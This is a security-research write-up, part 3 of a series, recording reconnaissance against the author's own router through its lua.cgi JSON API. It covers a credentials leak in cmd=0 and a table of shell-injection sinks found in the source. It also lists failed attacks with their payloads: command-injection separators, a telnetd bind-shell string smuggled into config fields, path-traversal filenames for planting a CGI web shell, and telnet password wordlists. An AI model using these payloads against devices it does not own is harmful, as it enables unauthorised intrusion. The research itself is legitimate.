# 03 — Reconnaissance

> 👤 **Author:** Nipun Methmal · Part 3 of 9 · [← Index](../README.md) · [Next →](04-rce-cmd-145.md)

Everything in this document is written honestly, including the parts that did not work — because
the failures are what made the eventual success make sense.

> ⚠️ **Scope.** Every probe below was run against a device **the author owns**, on an isolated LAN,
> for the purpose of repurposing it. Nothing here was run against infrastructure he did not own.

## Step 1 — Map the surface

A TCP sweep found six open ports (see [doc 01](01-hardware-and-attack-surface.md)). Port 80 was
obviously the interesting one: it serves a JSON API.

```
POST /cgi-bin/lua.cgi HTTP/1.1
Content-Type: application/json; charset=UTF-8
X-Requested-With: XMLHttpRequest

{"cmd":100,"method":"POST","sessionId":"<guid-md5>","language":"EN", ...}
```

Every request carries a numeric `cmd`. Responses are `{"cmd":N,"success":true|false,...}`.

### The session model

Login is `cmd=100`. The client invents its own `sessionId` (an MD5 of a GUID) and sends
`username` plus `passwd` **already MD5-hashed**:

```powershell
$md5pw   = (MD5 $Password)            # MD5 of the admin account's password
$sessionId = MD5 ([guid]::NewGuid())
'{"cmd":100,"method":"POST","sessionId":"' + $sessionId + '",
  "username":"admin","passwd":"' + $md5pw + '","language":"EN"}'
```

On success the device echoes back a `sessionId` with a server timestamp appended, and drops a file
at `/tmp/sessionsave/.<sessionId>`. That file **is** the authentication token — every later request
just needs its name to exist.

## Step 2 — Blind command sweep

With a session in hand, we swept every `cmd` we could think of and recorded which returned data.
The raw result file lists hundreds of entries like:

```
cmd=0   len=666 HIT :: {"cmd":0,"success":true,"data":{"wifi":{... "key":"…","ssid":"…"}}}
cmd=2   len=25  HIT :: {"cmd":2,"success":true}
cmd=24  len=27  HIT :: {"cmd":24,"success":false}
cmd=145 len=28  HIT :: {"cmd":145,"success":false}
cmd=1   len=0   STUB ::
...
```

Notable: **`cmd=0` returns the complete Wi‑Fi configuration, including the plaintext PSK** — a
credentials-disclosure bug in its own right, though it needs a valid session.

`cmd=145` was already interesting at this stage: it answered, but with `success:false` because we
hadn't supplied the right fields. We knew there was *something* there; we didn't yet know what.

## Step 3 — What did **not** work

### 3a. Blind command injection via guessed field names

The methodology was sound: send a payload that sleeps, measure whether the response takes longer
than baseline.

```powershell
$payloadSuffix = '$(sleep 6)'                 # also tried: ` ; \n && |
$obj[$field] = "127.0.0.1" + $payloadSuffix
# baseline ~730 ms  →  any response ≥ 4000 ms would indicate synchronous execution
```

Fields tested on `cmd=145`:

```
ip  url  host  addr  target  domain  server  count  interface  iface  type  packetSize  timeout
```

Result: **every one of them returned in 260–2506 ms.** No slow responses, no execution. The same
test was run against `cmd=11` (`timeServer`, `timezone`, `datetime`, …), `cmd=2` (`ssid`, `key`,
`channel`, …), `cmd=264`/`253` (SIP), `cmd=272` (`rpcapd_port`) and `cmd=121`.

```
baseline       elapsed=  730ms   json={"cmd":11,"success":true}
dollar-paren   elapsed=  657ms   json={"cmd":11,"success":true}
backtick       elapsed=  692ms   json={"cmd":11,"success":true}
semicolon      elapsed=  660ms   json={"cmd":11,"success":true}
pipe           elapsed=  730ms   json={"cmd":11,"success":true}
andand         elapsed=  811ms   json={"cmd":11,"success":true}
newline        elapsed=  666ms   json={"cmd":11,"success":true}
```

**No hit anywhere.**

> 🔍 **The real lesson.** The oracle wasn't broken — it was aimed at the wrong keys. We were
> guessing field names (`ip`, `host`, `url`…), but the handler is driven by `tool`, `pingUrl`,
> `pingNum`, `pingLoop`, `traceUrl`, `tracePort` and `catchPackageIfname`. Guessing those names
> blind is close to hopeless. Reading `system.lua` took thirty seconds and answered it outright.

### 3b. Spawning a listener through cosmetic fields

We tried to smuggle `telnetd -l /bin/sh -p 2323` through fields the UI writes to configuration:

```
cmd=2   field=ssid   value=…$(telnetd -l /bin/sh -p 2323)  → {"cmd":2,"success":true}   no shell after 25s
cmd=2   field=ssid   value=…;telnetd -l /bin/sh -p 2323;  → (empty)                    no shell after 25s
cmd=2   field=ssid   value=…`telnetd …`                   → (empty)                    no shell after 25s
cmd=11  field=timeServer …$(telnetd …)                    → {"cmd":11,"success":true}  no shell after 25s
cmd=272 field=rpcapd_port …$(telnetd …)                   → {"success":true,"cmd":272} no shell after 25s

ALL PAYLOADS TESTED - no shell
```

These values are stored through `uci`, not passed to a shell — which is exactly why they failed,
and exactly why `pingUrl` succeeds later.

### 3c. Upload + path traversal → web-shell

`cmd=5` accepts a multipart upload and reports `{"cmd":5,"success":true}`. The CGI names the target
file from the client-supplied filename, so we tried to write a CGI into the web root:

```
../../cgi-bin/probe.cgi      ..%2F..%2Fcgi-bin%2Fprobe2.cgi
....//....//cgi-bin/probe3.cgi     ..\..\cgi-bin\probe4.cgi
/www/cgi-bin/probe5.cgi       probe6.cgi
```

Payload served back a marker so execution would be unmistakable:

```sh
#!/bin/sh
echo "Content-Type: text/plain"
echo
echo PWNED_CGI_OK
```

Probing `/cgi-bin/probe*.cgi` and `/probe*.cgi` afterwards: **404 on every one.** The upload
returned success (it always does) but nothing executable landed where we looked.

### 3d. Telnet credential guessing

A wordlist was run against port 23 **on our own device** — default vendor users, the device MAC, the
stock Wi‑Fi key, common router passwords:

```
users:      root admin cpe dialog tz tozed support user service supervisor
passwords:  admin root password 1234 … <stock wifi key> <device MAC> P11IDU <vendor strings> …
```

Result: `UNKNOWN`, `NO_PROMPT`, `NO_PROMPT`, `NO_PROMPT` — no match. (Telnet authentication was
never needed in the end.)

### 3e. Wi‑Fi key candidates

A short list of likely defaults was tried against the AP:

```
… => False
… => False
RESULT: none matched
```

## Step 4 — Stop guessing, read the source

After the firmware extraction in [doc 02](02-firmware-dump-and-extraction.md), the question stopped
being "which of these 300 commands might be vulnerable" and became "show me every place the vendor
calls a shell".

`lua.cgi` alone contains:

| Line | Code | Note |
|------|------|------|
| 20 | `io.popen("env")` | benign |
| 116–117 | `os.execute(string.format("rm /tmp/sessionsave/.%s", tz_req["sessionId"]))` | **`sessionId` → shell** |
| 146–154 | `os.execute(string.format("sed -i 's/%s.js/…' …", oldLanguage, …))` | **`languageOld` → shell** |
| 1418 | `io.popen(string.format("sendat -d/dev/ttyUSB3 -e %s", tz_req["atCmd"]))` | **`atCmd` → shell** |
| 2418 | `[145] = network_tool` | ← the one we use |

And `system.lua` hands `pingUrl` straight to `os.execute`.

That is the subject of the next document.

---

> 📖 Next: **[04 — The `cmd=145` RCE](04-rce-cmd-145.md)**

---
> ✍️ © 2026 **Nipun Methmal** · MIT License · *p11idu-openwrt-repeater*
